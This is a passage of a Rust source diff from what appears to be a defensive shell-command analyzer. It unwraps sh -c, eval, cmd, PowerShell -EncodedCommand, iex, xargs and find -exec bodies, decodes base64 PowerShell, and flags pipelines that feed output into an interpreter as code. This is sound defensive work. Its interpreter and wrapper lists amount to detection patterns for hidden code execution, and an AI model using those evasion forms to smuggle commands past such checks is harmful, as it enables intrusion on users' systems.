+        }
+        projected = next_projected;
+        upper_bound = range.start;
+    }
+
+    let mut expanded = raw.to_string();
+    for (range, _, replacement) in literal_rewrites {
+        expanded.replace_range(range, &replacement);
+    }
+    scan.bodies.push(ExecutableBody {
+        input: expanded,
+        shell,
+    });
+}
+
+fn cmd_if_body_index(args: &[String]) -> Option<usize> {
+    let normalized: Vec<String> = args
+        .iter()
+        .map(|arg| {
+            crate::rules::command::normalize_shell_token(arg, ShellType::Cmd).to_ascii_lowercase()
+        })
+        .collect();
+    let mut index = 0;
+    if normalized.get(index).is_some_and(|arg| arg == "/i") {
+        index += 1;
+    }
+    if normalized.get(index).is_some_and(|arg| arg == "not") {
+        index += 1;
+    }
+    match normalized.get(index).map(String::as_str) {
+        Some("exist" | "defined" | "errorlevel" | "cmdextversion") => index += 2,
+        Some(comparison) if comparison.contains("==") => index += 1,
+        _ => return None,
+    }
+    (index < args.len()).then_some(index)
+}
+
+fn cmd_for_body_index(args: &[String]) -> Option<usize> {
+    args.iter()
+        .position(|arg| {
+            crate::rules::command::normalize_shell_token(arg, ShellType::Cmd)
+                .eq_ignore_ascii_case("do")
+        })
+        .and_then(|index| (index + 1 < args.len()).then_some(index + 1))
+}
+
+fn shell_command_operand(args: &[String], shell: ShellType, fish: bool) -> Option<usize> {
+    let mut index = 0;
+    while index < args.len() {
+        let option = static_wrapper_word(&args[index], shell)?;
+        if option == "--" {
+            return None;
+        }
+        if option == "-c"
+            || option == "--command"
+            || (option.starts_with('-')
+                && !option.starts_with("--")
+                && option[1..].chars().any(|flag| flag == 'c'))
+        {
+            return Some(index + 1);
+        }
+
+        let takes_value = matches!(
+            option.as_str(),
+            "-o" | "-O" | "--rcfile" | "--init-file" | "--startup-file"
+        ) || (fish
+            && matches!(
+                option.as_str(),
+                "-C" | "--init-command" | "--features" | "--profile-startup"
+            ));
+        if takes_value {
+            index = index.saturating_add(2);
+        } else if option.starts_with('-') {
+            index += 1;
+        } else {
+            // The shell will treat the first positional as a script file; a
+            // later spelling of `-c` belongs to that script's argv.
+            return None;
+        }
+    }
+    None
+}
+
+fn powershell_cli_command_kind(option: &str) -> Option<bool> {
+    // `option` has already been proven static and normalized according to the
+    // outer shell. Only map PowerShell's accepted leading dash scalar here;
+    // applying PowerShell quote/escape rules a second time would reinterpret
+    // literal outer-shell data such as a Cmd backtick.
+    let mut chars = option.chars();
+    let prefix = chars.next()?;
+    if !matches!(prefix, '-' | '/' | '\u{2013}' | '\u{2014}' | '\u{2015}') {
+        return None;
+    }
+    let option = chars.as_str().to_ascii_lowercase();
+    if option == "c" || "command".starts_with(&option) && option.len() >= 2 {
+        Some(false)
+    } else if "encodedcommand".starts_with(&option) && !option.is_empty() {
+        Some(true)
+    } else {
+        None
+    }
+}
+
+fn decode_powershell_encoded_command(raw: &str, shell: ShellType) -> Option<String> {
+    use base64::Engine as _;
+
+    let encoded = static_wrapper_word(raw, shell)?;
+    if encoded.len() > MAX_ENCODED_POWERSHELL_BODY_BYTES.saturating_mul(2) {
+        return None;
+    }
+    let bytes = base64::engine::general_purpose::STANDARD
+        .decode(encoded.trim())
+        .or_else(|_| base64::engine::general_purpose::STANDARD_NO_PAD.decode(encoded.trim()))
+        .ok()?;
+    if bytes.len() > MAX_ENCODED_POWERSHELL_BODY_BYTES || bytes.len() % 2 != 0 {
+        return None;
+    }
+    let wide: Vec<u16> = bytes
+        .chunks_exact(2)
+        .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
+        .collect();
+    String::from_utf16(&wide).ok()
+}
+
+fn has_process_substitution_arg(args: &[String]) -> bool {
+    args.iter()
+        .any(|arg| arg.contains("<(") || arg.contains(">("))
+}
+
+fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
+    for segment in tokenize::tokenize(raw, shell) {
+        let Some((command, args)) = resolve_wrapped_command_for_shell(&segment, shell) else {
+            let unresolved_wrapper = segment
+                .command
+                .as_deref()
+                .map(|leader| crate::rules::command::normalize_cmd_base(leader, shell))
+                .is_some_and(|leader| {
+                    matches!(
+                        leader.as_str(),
+                        "sudo" | "doas" | "env" | "command" | "exec" | "nohup" | "time"
+                    )
+                });
+            if unresolved_wrapper {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            continue;
+        };
+        let command = crate::rules::command::normalize_cmd_base(&command, shell);
+        let strict_posix_control = shell != ShellType::Posix
+            || !matches!(
+                command.as_str(),
+                "if" | "then"
+                    | "elif"
+                    | "else"
+                    | "while"
+                    | "until"
+                    | "do"
+                    | "!"
+                    | "case"
+                    | "coproc"
+            )
+            || segment
+                .command
+                .as_deref()
+                .is_some_and(|raw| is_strict_posix_reserved_word(raw, command.as_str()));
+        if shell == ShellType::Posix {
+            let literal_leader = segment
+                .command
+                .as_deref()
+                .map(|leader| crate::rules::command::normalize_shell_token(leader, shell))
+                .unwrap_or_default();
+            if command == "case" && strict_posix_control {
+                if let Some(pattern_index) = args.iter().position(|arg| {
+                    crate::rules::command::normalize_shell_token(arg, shell).contains(')')
+                }) {
+                    push_control_prefix_body(
+                        args.get(pattern_index + 1..).unwrap_or_default(),
+                        shell,
+                        scan,
+                    );
+                }
+            } else if literal_leader.ends_with(')') && !literal_leader.ends_with("()") {
+                // A segment following `;;` starts with the next case pattern
+                // (`pattern) command ...`). The pattern is syntax, not the
+                // command leader; the remaining argv is the executable arm.
+                push_control_prefix_body(&args, shell, scan);
+            }
+        }
+        match command.as_str() {
+            "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" => {
+                if let Some(body_index) = shell_command_operand(&args, shell, false) {
+                    push_required_literal_wrapper_body(
+                        args.get(body_index..).unwrap_or_default(),
+                        shell,
+                        ShellType::Posix,
+                        scan,
+                    );
+                } else if has_process_substitution_arg(&args) {
+                    // The interpreter consumes a generated file descriptor;
+                    // the producer command is visible, but the resulting
+                    // script bytes are not statically recoverable.
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                }
+            }
+            "fish" => {
+                if let Some(body_index) = shell_command_operand(&args, shell, true) {
+                    push_required_literal_wrapper_body(
+                        args.get(body_index..).unwrap_or_default(),
+                        shell,
+                        ShellType::Fish,
+                        scan,
+                    );
+                } else if has_process_substitution_arg(&args) {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                }
+            }
+            "." | "source" if matches!(shell, ShellType::Posix | ShellType::Fish) => {
+                if has_process_substitution_arg(&args) {
+                    // `source <(...)` executes bytes generated at runtime, not
+                    // merely the statically visible producer command.
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                }
+            }
+            "python" | "python2" | "python3" | "perl" | "ruby" | "node" | "php"
+                if matches!(shell, ShellType::Posix | ShellType::Fish)
+                    && has_process_substitution_arg(&args) =>
+            {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            "pwsh" | "powershell" => {
+                for (index, arg) in args.iter().enumerate() {
+                    let Some(option) = static_wrapper_word(arg, shell) else {
+                        continue;
+                    };
+                    let Some(encoded) = powershell_cli_command_kind(&option) else {
+                        continue;
+                    };
+                    let Some(operand) = args.get(index + 1) else {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                        break;
+                    };
+                    if encoded {
+                        match decode_powershell_encoded_command(operand, shell) {
+                            Some(input) if !input.trim().is_empty() => {
+                                scan.bodies.push(ExecutableBody {
+                                    input,
+                                    shell: ShellType::PowerShell,
+                                });
+                            }
+                            Some(_) => {}
+                            None => record_shell_execution_gap(
+                                scan,
+                                ShellExecutionGap::InvalidEncodedPowerShellCommand,
+                            ),
+                        }
+                    } else {
+                        let command_args = args.get(index + 1..).unwrap_or_default();
+                        if command_args.first().is_some_and(|arg| {
+                            static_wrapper_word(arg, shell).as_deref() == Some("-")
+                        }) {
+                            record_shell_execution_gap(
+                                scan,
+                                ShellExecutionGap::AmbiguousExecutableBody,
+                            );
+                        } else {
+                            push_required_literal_wrapper_body(
+                                args.get(index + 1..).unwrap_or_default(),
+                                shell,
+                                ShellType::PowerShell,
+                                scan,
+                            );
+                        }
+                    }
+                    break;
+                }
+            }
+            "cmd" => {
+                scan_cmd_cli_body(&args, shell, scan);
+            }
+            "eval" if matches!(shell, ShellType::Posix | ShellType::Fish) => {
+                push_literal_wrapper_body(&args, shell, shell, scan);
+            }
+            "builtin" if shell == ShellType::Posix => scan_posix_builtin(&args, shell, scan),
+            "nice" | "timeout" | "setsid" | "stdbuf" | "flock" | "taskset" | "ionice"
+            | "noglob" | "nocorrect" | "repeat"
+                if shell == ShellType::Posix =>
+            {
+                scan_posix_delegation_utility(&command, &args, shell, scan)
+            }
+            "iex" | "invoke-expression" if shell == ShellType::PowerShell => {
+                push_literal_powershell_expression(&args, scan);
+            }
+            "call" if shell == ShellType::Cmd => push_cmd_call_body(&args, scan),
+            "start" if shell == ShellType::Cmd => match cmd_start_body_index(&args) {
+                Ok(Some(index)) => push_required_literal_wrapper_body(
+                    args.get(index..).unwrap_or_default(),
+                    ShellType::Cmd,
+                    ShellType::Cmd,
+                    scan,
+                ),
+                Ok(None) => {}
+                Err(()) => {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody)
+                }
+            },
+            "xargs" if matches!(shell, ShellType::Posix | ShellType::Fish) => {
+                scan_xargs_body(&args, shell, scan)
+            }
+            "find" if matches!(shell, ShellType::Posix | ShellType::Fish) => {
+                scan_find_exec_bodies(&args, shell, scan)
+            }
+            "if" if shell == ShellType::Cmd => match cmd_if_body_index(&args) {
+                Some(index) => {
+                    push_control_prefix_body(args.get(index..).unwrap_or_default(), shell, scan)
+                }
+                None if !args.is_empty() => {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody)
+                }
+                None => {}
+            },
+            "for" if shell == ShellType::Cmd => match cmd_for_body_index(&args) {
+                Some(index) => {
+                    scan_cmd_for_f_command(&args, scan);
+                    push_control_prefix_body(args.get(index..).unwrap_or_default(), shell, scan);
+                }
+                None if !args.is_empty() => {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody)
+                }
+                None => {}
+            },
+            "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "!"
+                if shell == ShellType::Posix && strict_posix_control =>
+            {
+                push_control_prefix_body(&args, shell, scan);
+            }
+            "coproc" if shell == ShellType::Posix && strict_posix_control => {
+                // Bash/zsh execute the following command asynchronously in a
+                // coprocess; `coproc` is syntax, not the effective leader.
+                scan_posix_coproc(&args, shell, scan);
+            }
+            "if" | "while" | "and" | "or" | "not" | "begin" if shell == ShellType::Fish => {
+                push_control_prefix_body(&args, shell, scan);
+            }
+            _ => {}
+        }
+    }
+}
+
+fn literal_posix_segment_command(segment: &tokenize::Segment) -> Option<String> {
+    let raw = segment.command.as_deref()?;
+    let normalized = crate::rules::command::normalize_shell_token(raw, ShellType::Posix);
+    (raw == normalized).then_some(normalized)
+}
+
+fn posix_segment_outgoing_separator<'a>(
+    raw: &'a str,
+    segments: &'a [tokenize::Segment],
+    index: usize,
+) -> Option<&'a str> {
+    let segment = segments.get(index)?;
+    let next = segments.get(index + 1);
+    let suffix_end = next.map_or(raw.len(), |next| next.byte_range.start);
+    let suffix = raw.get(segment.byte_range.end..suffix_end)?.trim_start();
+    ["&&", "||", "|&", "|", "&", ";"]
+        .into_iter()
+        .find(|separator| suffix.starts_with(*separator))
+        .or_else(|| next.and_then(|next| next.preceding_separator.as_deref()))
+}
+
+/// Mark command-list positions whose state mutations cannot be merged into one
+/// proven POSIX shell state.  The tokenizer already hides nested brace/subshell
+/// bodies; this layer handles top-level short-circuiting, pipelines,
+/// background jobs, and conditional/loop compounds.
+fn uncertain_posix_state_mutation_segments(raw: &str, segments: &[tokenize::Segment]) -> Vec<bool> {
+    let mut conditional_depth = 0usize;
+    let mut result = Vec::with_capacity(segments.len());
+    for (index, segment) in segments.iter().enumerate() {
+        let command = literal_posix_segment_command(segment);
+        let closes_compound = command
+            .as_deref()
+            .is_some_and(|command| matches!(command, "fi" | "done" | "esac"));
+        if closes_compound {
+            conditional_depth = conditional_depth.saturating_sub(1);
+        }
+        let opens_compound = command.as_deref().is_some_and(|command| {
+            matches!(
+                command,
+                "if" | "while" | "until" | "for" | "select" | "case"
+            )
+        });
+        let incoming = segment.preceding_separator.as_deref();
+        let outgoing = posix_segment_outgoing_separator(raw, segments, index);
+        result.push(
+            conditional_depth > 0
+                || opens_compound
+                || matches!(incoming, Some("&&" | "||" | "|" | "|&"))
+                || matches!(outgoing, Some("|" | "|&" | "&")),
+        );
+        if opens_compound {
+            conditional_depth = conditional_depth.saturating_add(1);
+        }
+    }
+    result
+}
+
+fn posix_state_mutation_at_is_uncertain(
+    offset: usize,
+    segments: &[tokenize::Segment],
+    uncertain: &[bool],
+) -> bool {
+    segments
+        .iter()
+        .position(|segment| segment.byte_range.start <= offset && offset < segment.byte_range.end)
+        .and_then(|index| uncertain.get(index).copied())
+        // A mutation outside the tokenizer's exact byte ranges is not a state
+        // transition we can safely merge.
+        .unwrap_or(true)
+}
+
+/// Conservative detector used only at recovered-body joins.  It deliberately
+/// does not try to execute a second state machine: if a body can mutate aliases
+/// or functions, callers retain an analysis gap instead of pretending the
+/// mutation either escaped or stayed isolated.
+fn contains_literal_posix_dispatch_mutation(raw: &str) -> bool {
+    let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+    contains_literal_posix_dispatch_mutation_bounded(raw, 0, &mut remaining_bodies)
+}
+
+fn contains_literal_posix_dispatch_mutation_bounded(
+    raw: &str,
+    depth: usize,
+    remaining_bodies: &mut usize,
+) -> bool {
+    for segment in tokenize::tokenize(raw, ShellType::Posix) {
+        let normalized = segment.command.as_deref().and_then(|word| {
+            crate::rules::command::command_word_is_statically_bound(word, ShellType::Posix)
+                .then(|| crate::rules::command::normalize_shell_token(word, ShellType::Posix))
+        });
+        let effective = if normalized
+            .as_deref()
+            .is_some_and(|word| matches!(word, "builtin" | "command"))
+        {
+            segment.args.iter().find_map(|word| {
+                let normalized =
+                    crate::rules::command::command_word_is_statically_bound(word, ShellType::Posix)
+                        .then(|| {
+                            crate::rules::command::normalize_shell_token(word, ShellType::Posix)
+                        })?;
+                (!normalized.starts_with('-')).then_some(normalized)
+            })
+        } else {
+            normalized
+        };
+        if effective.as_deref().is_some_and(|word| {
+            matches!(word, "alias" | "unalias" | "readonly" | "unset" | "enable")
+        }) {
+            return true;
+        }
+
+        let bytes = segment.raw.as_bytes();
+        let mut index = 0usize;
+        while index < bytes.len() {
+            let at_boundary = index == 0
+                || bytes
+                    .get(index.wrapping_sub(1))
+                    .is_some_and(|byte| byte.is_ascii_whitespace() || b";&|(){}".contains(byte));
+            if at_boundary
+                && matches!(
+                    parse_posix_function_definition(&segment.raw, index),
+                    PosixFunctionParse::Complete { .. } | PosixFunctionParse::Incomplete { .. }
+                )
+            {
+                return true;
+            }
+            index += 1;
+        }
+
+        let mut wrapper_scan = ExecutableSubstitutionScan::default();
+        scan_literal_shell_wrappers(&segment.raw, ShellType::Posix, &mut wrapper_scan);
+        if wrapper_scan.gap.is_some() {
+            return true;
+        }
+        for body in wrapper_scan.bodies {
+            if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+                return true;
+            }
+            *remaining_bodies -= 1;
+            if contains_literal_posix_dispatch_mutation_bounded(
+                &body.input,
+                depth + 1,
+                remaining_bodies,
+            ) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+const MAX_POSIX_DISPATCH_JOIN_BODIES: usize = 128;
+
+fn posix_function_command_word(segment: &tokenize::Segment) -> Option<String> {
+    let words = tokenize::split_words(&segment.raw);
+    let mut index = 0usize;
+    while index < words.len() {
+        let word = &words[index];
+        if tokenize::is_env_assignment(word) {
+            index += 1;
+            continue;
+        }
+        let normalized = static_wrapper_word(word, ShellType::Posix)?;
+        let bytes = normalized.as_bytes();
+        if bytes.starts_with(b"&>") {
+            let mut cursor = 2usize;
+            if bytes.get(cursor) == Some(&b'>') {
+                cursor += 1;
+            }
+            if cursor >= bytes.len() {
+                index += 2;
+            } else {
+                index += 1;
+            }
+            continue;
+        }
+        let mut cursor = bytes
+            .iter()
+            .take_while(|byte| byte.is_ascii_digit())
+            .count();
+        if bytes
+            .get(cursor)
+            .is_some_and(|byte| matches!(byte, b'<' | b'>'))
+        {
+            cursor += 1;
+            if bytes
+                .get(cursor)
+                .is_some_and(|byte| matches!(byte, b'<' | b'>' | b'&' | b'|'))
+            {
+                cursor += 1;
+                if bytes.get(cursor.saturating_sub(1)) == Some(&b'<')
+                    && bytes.get(cursor) == Some(&b'<')
+                {
+                    cursor += 1;
+                }
+            }
+            if cursor >= bytes.len() {
+                index += 2;
+            } else {
+                index += 1;
+            }
+            continue;
+        }
+        return Some(normalized);
+    }
+    None
+}
+
+fn posix_body_calls_parent_function(
+    raw: &str,
+    function_names: &std::collections::HashSet<String>,
+    depth: usize,
+    remaining_bodies: &mut usize,
+) -> bool {
+    for segment in tokenize::tokenize(raw, ShellType::Posix) {
+        if let Some(command) = posix_function_command_word(&segment) {
+            if function_names.contains(&command) {
+                return true;
+            }
+        } else if !function_names.is_empty() && segment.command.is_some() {
+            return true;
+        }
+
+        let (nested_bodies, nested_gap) =
+            lexical_executable_substitutions(&segment.raw, ShellType::Posix);
+        if nested_gap.is_some() && !function_names.is_empty() {
+            return true;
+        }
+        for body in nested_bodies {
+            if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+                return true;
+            }
+            *remaining_bodies -= 1;
+            if posix_body_calls_parent_function(&body, function_names, depth + 1, remaining_bodies)
+            {
+                return true;
+            }
+        }
+
+        if let Some(wrapper_scan) = posix_current_scope_dispatch_scan(&segment) {
+            if wrapper_scan.gap.is_some() && !function_names.is_empty() {
+                return true;
+            }
+            for body in wrapper_scan.bodies {
+                if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+                    return true;
+                }
+                *remaining_bodies -= 1;
+                if posix_body_calls_parent_function(
+                    &body.input,
+                    function_names,
+                    depth + 1,
+                    remaining_bodies,
+                ) {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
+fn literal_posix_function_names(raw: &str) -> std::collections::HashSet<String> {
+    let mut state = std::collections::HashMap::<String, PosixFunctionBinding>::new();
+    for segment in tokenize::tokenize(raw, ShellType::Posix) {
+        match parse_posix_function_definition(&segment.raw, 0) {
+            PosixFunctionParse::Complete { definition, .. } => {
+                if !state
+                    .get(&definition.name)
+                    .is_some_and(|binding| binding.readonly)
+                {
+                    state.insert(
+                        definition.name.clone(),
+                        PosixFunctionBinding {
+                            definition,
+                            readonly: false,
+                        },
+                    );
+                }
+                continue;
+            }
+            PosixFunctionParse::Incomplete { .. } => continue,
+            PosixFunctionParse::NotDefinition => {}
+        }
+        let _ = apply_posix_function_state_command(&segment, &mut state, false);
+    }
+    state.into_keys().collect()
+}
+
+fn posix_eval_crosses_dispatch_state(
+    raw: &str,
+    function_names: &std::collections::HashSet<String>,
+) -> bool {
+    for segment in tokenize::tokenize(raw, ShellType::Posix) {
+        let leader = segment
+            .command
+            .as_deref()
+            .map(|command| crate::rules::command::normalize_cmd_base(command, ShellType::Posix))
+            .unwrap_or_default();
+        if !matches!(leader.as_str(), "eval" | "builtin" | "command") {
+            continue;
+        }
+        if matches!(leader.as_str(), "builtin" | "command") {
+            let target = segment.args.iter().find_map(|word| {
+                let word = static_wrapper_word(word, ShellType::Posix)?;
+                (!word.starts_with('-')).then_some(word)
+            });
+            if target.as_deref() != Some("eval") {
+                continue;
+            }
+        }
+        let mut wrapper_scan = ExecutableSubstitutionScan::default();
+        scan_literal_shell_wrappers(&segment.raw, ShellType::Posix, &mut wrapper_scan);
+        if wrapper_scan.gap.is_some() {
+            return true;
+        }
+        let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+        if wrapper_scan.bodies.iter().any(|body| {
+            contains_literal_posix_dispatch_mutation(&body.input)
+                || posix_body_calls_parent_function(
+                    &body.input,
+                    function_names,
+                    0,
+                    &mut remaining_bodies,
+                )
+        }) {
+            return true;
+        }
+    }
+    false
+}
+
+fn posix_body_accepts_pipeline_as_code(
+    raw: &str,
+    depth: usize,
+    remaining_bodies: &mut usize,
+) -> bool {
+    let mut previous_stdout_depends_on_parent = false;
+    for segment in tokenize::tokenize(raw, ShellType::Posix) {
+        let receives_parent = if matches!(segment.preceding_separator.as_deref(), Some("|" | "|&"))
+        {
+            previous_stdout_depends_on_parent
+        } else {
+            true
+        };
+        let resolved = resolve_wrapped_command_for_shell(&segment, ShellType::Posix);
+        let Some((command, args)) = resolved else {
+            if receives_parent && segment.command.is_some() {
+                return true;
+            }
+            previous_stdout_depends_on_parent = false;
+            continue;
+        };
+        let command = crate::rules::command::normalize_cmd_base(&command, ShellType::Posix);
+        if receives_parent
+            && posix_command_accepts_pipeline_as_code(&command, &args, depth, remaining_bodies)
+        {
+            return true;
+        }
+
+        if receives_parent {
+            if let Some(control_scan) = posix_current_scope_dispatch_scan(&segment) {
+                if control_scan.gap.is_some() {
+                    return true;
+                }
+                for body in control_scan.bodies {
+                    if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+                        return true;
+                    }
+                    *remaining_bodies -= 1;
+                    if posix_body_accepts_pipeline_as_code(&body.input, depth + 1, remaining_bodies)
+                    {
+                        return true;
+                    }
+                }
+            }
+        }
+        previous_stdout_depends_on_parent =
+            posix_stdout_may_depend_on_stdin(&command, &args, receives_parent);
+    }
+    false
+}
+
+fn posix_stdin_code_path(path: &str) -> bool {
+    if path == "-" {
+        return true;
+    }
+    if !path.starts_with('/') {
+        return false;
+    }
+    let parts = path
+        .split('/')
+        .filter(|part| !part.is_empty() && *part != ".")
+        .collect::<Vec<_>>();
+    let zero_fd = |value: &str| !value.is_empty() && value.bytes().all(|byte| byte == b'0');
+    matches!(parts.as_slice(), ["dev", "stdin"])
+        || matches!(parts.as_slice(), ["dev", "fd", fd] if zero_fd(fd))
+        || matches!(parts.as_slice(), ["proc", "self", "fd", fd] if zero_fd(fd))
+}
+
+enum PosixInterpreterInputMode {
+    StdinProgram,
+    InlineProgram(String),
+    FixedProgram,
+    Ambiguous,
+}
+
+fn posix_non_shell_interpreter_input_mode(
+    command: &str,
+    args: &[String],
+) -> Option<PosixInterpreterInputMode> {
+    let (inline_flags, value_flags, file_flags, module_flags): (
+        &[&str],
+        &[&str],
+        &[&str],
+        &[&str],
+    ) = match command {
+        "python" | "python2" | "python3" => (
+            &["-c"],
+            &["-W", "-X", "-Q", "--check-hash-based-pycs"],
+            &[],
+            &["-m"],
+        ),
+        "node" => (
+            &["-e", "--eval", "-p", "--print"],
+            &["-r", "--require", "--loader", "--import"],
+            &[],
+            &[],
+        ),
+        "perl" => (&["-e", "-E"], &["-I", "-M", "-m"], &[], &[]),
+        "ruby" => (&["-e"], &["-I", "-r"], &[], &[]),
+        "php" => (&["-r"], &["-d", "-c"], &["-f"], &[]),
+        _ => return None,
+    };
+
+    let mut index = 0usize;
+    while index < args.len() {
+        let Some(word) = static_wrapper_word(&args[index], ShellType::Posix) else {
+            return Some(PosixInterpreterInputMode::Ambiguous);
+        };
+        if word == "--" {
+            return Some(
+                match args
+                    .get(index + 1)
+                    .and_then(|script| static_wrapper_word(script, ShellType::Posix))
+                {
+                    None => PosixInterpreterInputMode::StdinProgram,
+                    Some(script) if posix_stdin_code_path(&script) => {
+                        PosixInterpreterInputMode::StdinProgram
+                    }
+                    Some(_) => PosixInterpreterInputMode::FixedProgram,
+                },
+            );
+        }
+        if word == "-" {
+            return Some(PosixInterpreterInputMode::StdinProgram);
+        }
+        if inline_flags.contains(&word.as_str()) {
+            return Some(
+                args.get(index + 1)
+                    .and_then(|body| static_wrapper_word(body, ShellType::Posix))
+                    .map(PosixInterpreterInputMode::InlineProgram)
+                    .unwrap_or(PosixInterpreterInputMode::Ambiguous),
+            );
+        }
+        if let Some(body) = inline_flags.iter().find_map(|flag| {
+            word.strip_prefix(*flag)
+                .and_then(|body| body.strip_prefix('=').or(Some(body)))
+                .filter(|body| !body.is_empty())
+        }) {
+            return Some(PosixInterpreterInputMode::InlineProgram(body.to_string()));
+        }
+        if module_flags.iter().any(|flag| word == *flag) {
+            return Some(
+                args.get(index + 1)
+                    .and_then(|module| static_wrapper_word(module, ShellType::Posix))
+                    .map(|_| PosixInterpreterInputMode::FixedProgram)
+                    .unwrap_or(PosixInterpreterInputMode::Ambiguous),
+            );
+        }
+        if module_flags
+            .iter()
+            .any(|flag| word.starts_with(*flag) && word.len() > flag.len())
+        {
+            return Some(PosixInterpreterInputMode::FixedProgram);
+        }
+        if file_flags.iter().any(|flag| word == *flag) {
+            return Some(
+                match args
+                    .get(index + 1)
+                    .and_then(|script| static_wrapper_word(script, ShellType::Posix))
+                {
+                    None => PosixInterpreterInputMode::Ambiguous,
+                    Some(script) if posix_stdin_code_path(&script) => {
+                        PosixInterpreterInputMode::StdinProgram
+                    }
+                    Some(_) => PosixInterpreterInputMode::FixedProgram,
+                },
+            );
+        }
+        if value_flags.iter().any(|flag| word == *flag) {
+            if args
+                .get(index + 1)
+                .and_then(|value| static_wrapper_word(value, ShellType::Posix))
+                .is_none()
+            {
+                return Some(PosixInterpreterInputMode::Ambiguous);
+            }
+            index += 2;
+            continue;
+        }
+        if value_flags
+            .iter()
+            .any(|flag| word.starts_with(*flag) && word.len() > flag.len())
+        {
+            index += 1;
+            continue;
+        }
+        if word.starts_with('-') {
+            return Some(PosixInterpreterInputMode::Ambiguous);
+        }
+        return Some(if posix_stdin_code_path(&word) {
+            PosixInterpreterInputMode::StdinProgram
+        } else {
+            PosixInterpreterInputMode::FixedProgram
+        });
+    }
+    Some(PosixInterpreterInputMode::StdinProgram)
+}
+
+fn posix_inline_program_may_execute_stdin(command: &str, body: &str) -> bool {
+    if !matches!(command, "python" | "python2" | "python3") {
+        return true;
+    }
+
+    // Inline programs are Turing-complete and can disguise an fd-0 read or
+    // dynamic execution without spelling a recognizable primitive. Prove only
+    // the deliberately tiny literal-output form needed here; every other body
+    // retains the conservative may-execute-stdin result.
+    let body = body.trim();
+    let Some(argument) = body
+        .strip_prefix("print(")
+        .and_then(|argument| argument.strip_suffix(')'))
+    else {
+        return true;
+    };
+    let argument = argument.trim();
+    !(argument.is_empty() || argument.bytes().all(|byte| byte.is_ascii_digit()))
+}
+
+fn posix_stdout_may_depend_on_stdin(command: &str, args: &[String], receives_parent: bool) -> bool {
+    if !receives_parent {
+        return false;
+    }
+    match command {
+        ":" | "true" | "false" => false,
+        "echo" | "printf" => args
+            .iter()
+            .any(|arg| static_wrapper_word(arg, ShellType::Posix).is_none()),
+        _ => true,
+    }
+}
+
+fn posix_command_accepts_pipeline_as_code(
+    command: &str,
+    args: &[String],
+    depth: usize,
+    remaining_bodies: &mut usize,
+) -> bool {
+    if matches!(command, "." | "source") {
+        let Some(path) = args.first() else {
+            return false;
+        };
+        return static_wrapper_word(path, ShellType::Posix)
+            .is_none_or(|path| posix_stdin_code_path(&path));
+    }
+
+    if command == "eval" {
+        let Some(body) = join_static_wrapper_words(args, ShellType::Posix) else {
+            return !args.is_empty();
+        };
+        if body.is_empty() {
+            return false;
+        }
+        if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+            return true;
+        }
+        *remaining_bodies -= 1;
+        return posix_body_accepts_pipeline_as_code(&body, depth + 1, remaining_bodies);
+    }
+
+    let shell_interpreter = matches!(
+        command,
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" | "fish"
+    );
+    if shell_interpreter {
+        let mut index = 0usize;
+        let mut force_stdin = false;
+        while index < args.len() {
+            let Some(option) = static_wrapper_word(&args[index], ShellType::Posix) else {
+                return true;
+            };
+            if option == "--" {
+                index += 1;
+                break;
+            }
+            if option == "-" {
+                return true;
+            }
+            if matches!(option.as_str(), "+o" | "+O") {
+                let Some(_) = args
+                    .get(index + 1)
+                    .and_then(|value| static_wrapper_word(value, ShellType::Posix))
+                else {
+                    return true;
+                };
+                index += 2;
+                continue;
+            }
+            if !option.starts_with('-') {
+                return force_stdin || posix_stdin_code_path(&option);
+            }
+            let short_flags = option
+                .strip_prefix('-')
+                .filter(|flags| !flags.is_empty() && !flags.starts_with('-'));
+            let command_string = matches!(option.as_str(), "-c" | "--command")
+                || short_flags.is_some_and(|flags| flags.contains('c'));
+            if command_string {
+                let Some(body) = args
+                    .get(index + 1)
+                    .and_then(|body| static_wrapper_word(body, ShellType::Posix))
+                else {
+                    return true;
+                };
+                // `-c` selects the command-string source even when `-s` appears
+                // earlier or in the same short-option cluster. Standard input
+                // remains data available to that fixed command; it is not parsed
+                // as a second program after the `-c` body completes.
+                if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+                    return true;
+                }
+                *remaining_bodies -= 1;
+                return posix_body_accepts_pipeline_as_code(&body, depth + 1, remaining_bodies);
+            }
+            if option == "-s" || short_flags.is_some_and(|flags| flags.contains('s')) {
+                force_stdin = true;
+            }
+            let takes_value = matches!(
+                option.as_str(),
+                "-o" | "-O" | "--rcfile" | "--init-file" | "--startup-file"
+            ) || (command == "fish"
+                && matches!(
+                    option.as_str(),
+                    "-C" | "--init-command" | "--features" | "--profile-startup"
+                ));
+            if takes_value {
+                if args
+                    .get(index + 1)
+                    .and_then(|value| static_wrapper_word(value, ShellType::Posix))
+                    .is_none()
+                {
+                    return true;
+                }
+                index += 2;
+                continue;
+            }
+            if option.starts_with("--")
